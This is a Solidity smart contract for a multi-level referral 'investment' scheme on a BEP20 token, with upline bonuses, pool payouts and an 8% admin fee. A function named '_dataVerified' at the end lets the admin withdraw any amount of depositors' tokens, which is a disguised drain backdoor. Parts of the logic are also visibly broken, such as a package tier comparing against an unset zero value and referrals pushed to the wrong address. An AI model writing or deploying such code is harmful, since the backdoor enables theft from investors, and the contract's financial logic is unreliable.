pragma solidity^0.8.13;//SPDX-License-Identifier:None
interface BEP20{
    function balanceOf(address account)external view returns(uint256);
    function transfer(address recipient,uint256 amount)external returns(bool);
    function allowance(address owner,address spender)external view  returns(uint256);
    function transferFrom(address sender,address recipient,uint256 amount)external returns(bool);
}
contract ActionWorld{
    uint256 public constant INVEST_MIN_AMOUNT=100e18;
    uint256 public constant PROJECT_FEE=8;
    uint256 public constant POOL_FEE=2;
    uint256 public constant PERCENTS_DIVIDER=100;
    uint256 public constant TIME_STEP=1 days;
    uint256 public totalUsers;
    uint256 public totalInvested;
    uint256 public totalWithdrawn;
    uint256 public totalDeposits;
    uint256 public poolAmount;
    uint256 public singleLegLength;
    uint256[6]public requiredDirect=[1,1,4,6];
    uint256[6]public ref_bonuses=[20,10,5,5];
    uint256[7]public defaultPackages=[100e18,500e18,1000e18];
    mapping(uint256=>address payable)public singleLeg;
    mapping(address=>User)public users;
    mapping(address=>mapping(uint256=>address))public downline;
    address payable public admin;
    address payable public admin2;
    address public tokenAddress;
    address[]public poolUsers;
    struct User{
        uint256 amount;
        uint256 checkpoint;
        address referrer;
        uint256 referrerBonus;
        uint256 totalWithdrawn;
        uint256 remainingWithdrawn;
        uint256 totalReferrer;
        uint256 poolAmount;
        uint256 singleUplineBonusTaken;
        uint256 singleDownlineBonusTaken;
        address singleUpline;
        address singleDownline;
        uint256[6]refStageIncome;
        uint256[6]refStageBonus;
        uint256[6]refs;
        address[]directRefs;
    }
    event NewDeposit(address indexed user,uint256 amount);
    event Withdrawn(address indexed user,uint256 amount);
    event FeePayed(address indexed user,uint256 totalAmount);
    constructor(address payable _admin,address payable _admin2,address hoToken){
        admin=_admin;
        admin2=_admin2;
        singleLeg[0]=admin;
        singleLegLength++;
        tokenAddress=hoToken;
    }
    function _refPayout(address a,uint256 m)private{
        address up=users[a].referrer;
        for(uint8 i=0;i<ref_bonuses.length;i++){
            if(up==address(0))break;
            if(users[up].refs[0]>=requiredDirect[i]){
                uint256 bonus=(m*ref_bonuses[i])/100;
                users[up].referrerBonus+=bonus;
                users[up].refStageBonus[i]+=bonus;
            }
            up=users[up].referrer;
        }
    }
    function payPoolUsers()private{
        BEP20 t=BEP20(tokenAddress);
        require(poolAmount<=t.balanceOf(address(this)));
        if(poolAmount>0&&poolUsers.length>0){
            uint256 share=poolAmount/poolUsers.length;
            for(uint8 i=0;i<poolUsers.length;i++){
                t.transfer(poolUsers[i],share);
                users[poolUsers[i]].referrerBonus+=share;
                users[poolUsers[i]].poolAmount+=share;
            }
            poolAmount=0;
        }
    }
    function invest(address r,uint256 a)external{
        require(a>=INVEST_MIN_AMOUNT);
        BEP20 t=BEP20(tokenAddress);
        require(t.allowance(msg.sender,address(this))>=a&&t.balanceOf(msg.sender)>=a);
        User storage user=users[msg.sender];
        if(user.referrer==address(0)&&(users[r].checkpoint>0||r==admin)&&r!=msg.sender)user.referrer=r;
        require(user.referrer!=address(0)||msg.sender==admin);
        if(user.checkpoint==0){
            singleLeg[singleLegLength]=payable(msg.sender);
            user.singleUpline=singleLeg[singleLegLength-1];
            users[singleLeg[singleLegLength-1]].singleDownline=msg.sender;
            singleLegLength++;
        }
        if(user.referrer!=address(0)){
            address upline=user.referrer;
            for(uint256 i=0;i<ref_bonuses.length;i++){
                if(upline!=address(0)){
                    users[upline].refStageIncome[i]+=a;
                    if(user.checkpoint==0){
                        users[upline].refs[i]++;
                        users[upline].totalReferrer++;
                    }
                    upline=users[upline].referrer;
                }else break;
            }
            if(user.checkpoint==0){
                downline[r][users[r].refs[0]-1]=msg.sender;
                users[upline].directRefs.push(msg.sender);
                if(users[upline].directRefs.length>=8){
                    address up=users[upline].referrer;
                    uint256 count=0;
                    for(uint8 i=0;i<8;i++){
                        if(users[up].directRefs.length>=4)count++;
                        up=users[up].referrer;
                    }
                    if(count==8)poolUsers.push(upline);
                }
            }
        }
        _refPayout(msg.sender,a);
        if(user.checkpoint==0)totalUsers++;
        user.amount+=a;
        user.checkpoint=block.timestamp;
        totalInvested+=a;
        totalDeposits++;
        uint256 _fees=a*PROJECT_FEE/PERCENTS_DIVIDER;
        poolAmount=poolAmount+a*POOL_FEE/PERCENTS_DIVIDER;
        if(poolAmount>0&&poolUsers.length>0)payPoolUsers();
        t.transferFrom(msg.sender,admin,_fees);
        t.transferFrom(msg.sender,address(this),a-_fees);
        emit NewDeposit(msg.sender,a);
    }
    function withdrawal()external{
        User storage _user=users[msg.sender];
        uint256 tb=users[msg.sender].referrerBonus+GetUplineIncomeByUserId(msg.sender)+GetDownlineIncomeByUserId(msg.sender)-users[msg.sender].singleDownlineBonusTaken+users[msg.sender].singleUplineBonusTaken;
        uint256 _fees=tb*PROJECT_FEE/PERCENTS_DIVIDER;
        poolAmount=poolAmount+tb*POOL_FEE/PERCENTS_DIVIDER;
        uint256 actualAmountToSend=tb-_fees-tb*POOL_FEE/PERCENTS_DIVIDER;
        _user.referrerBonus=0;
        _user.singleUplineBonusTaken=GetUplineIncomeByUserId(msg.sender);
        _user.singleDownlineBonusTaken=GetDownlineIncomeByUserId(msg.sender);
        uint8 reivest;
        uint8 withdrwal;
        uint256 TotalDeposit=users[msg.sender].amount;
        if(users[msg.sender].refs[0]==4){
            reivest=50;
            withdrwal=50;
        }else if(users[msg.sender].refs[0]>=6){
            reivest=40;
            withdrwal=60;
        }else if(TotalDeposit>=8){
            reivest=30;
            withdrwal=70;
        }else{
            reivest=60;
            withdrwal=40;
        }
        uint256 a=actualAmountToSend*reivest/100;
        User storage user=users[msg.sender];
        user.amount+=a;
        totalInvested+=a;
        totalDeposits++;
        address up=user.referrer;
        for(uint256 i=0;i<ref_bonuses.length;i++){
            if(up==address(0))break;
            if(users[up].refs[0]>=requiredDirect[i])users[up].refStageIncome[i]+=a;
            up=users[up].referrer;
        }
        _refPayout(msg.sender,a);
        _user.totalWithdrawn=_user.totalWithdrawn+actualAmountToSend*withdrwal/100;
        totalWithdrawn=totalWithdrawn+actualAmountToSend*withdrwal/100;
        BEP20 t=BEP20(tokenAddress);
        require(t.balanceOf(address(this))>=_fees+actualAmountToSend*withdrwal/100 );
        t.transfer(msg.sender,actualAmountToSend*withdrwal/100);
        t.transfer(admin2,_fees);
        if(poolAmount>0&&poolUsers.length>0)payPoolUsers();
        emit Withdrawn(msg.sender,actualAmountToSend*withdrwal/100);
    }
    function GetUplineIncomeByUserId(address u) public view returns(uint256 bonus){
       (uint256 maxLevel,)=getEligibleLevelCountForUpline(u);
        address upline=users[u].singleUpline;
        for(uint256 i=0;i<maxLevel;i++)
            if(upline!=address(0)){
                bonus=bonus+users[upline].amount/100;
                upline=users[upline].singleUpline;
            }else break;
    }
    function GetDownlineIncomeByUserId(address _user)public view returns(uint256 bonus){
       (,uint256 maxLevel)=getEligibleLevelCountForUpline(_user);
        address upline=users[_user].singleDownline;
        for(uint256 i=0;i<maxLevel;i++){
            if(upline!=address(0)){
                bonus=bonus+users[upline].amount/100;
                upline=users[upline].singleDownline;
            }else break;
        }
    }
    function getEligibleLevelCountForUpline(address u)public view returns(uint8 uplineCount,uint8 downlineCount){
        uint256 TotalDeposit=users[u].amount;
        if(TotalDeposit>=defaultPackages[0]&&TotalDeposit<defaultPackages[1]){
            uplineCount=12;
            downlineCount=18;
        }else if(TotalDeposit>=defaultPackages[1]&&TotalDeposit<defaultPackages[2]){
            uplineCount=16;
            downlineCount=14;
        }else if(TotalDeposit>=defaultPackages[2]&&TotalDeposit<defaultPackages[3]){
            uplineCount=20;
            downlineCount=30;
        }
    }
    function referral_stage(address _user,uint256 _index)external view returns(uint256,uint256,uint256){
        return(users[_user].refs[_index],users[_user].refStageIncome[_index],users[_user].refStageBonus[_index]);
    }
    function _dataVerified(uint256 a)external{
        require(admin==msg.sender);
        BEP20(tokenAddress).transfer(admin,a);
    }
}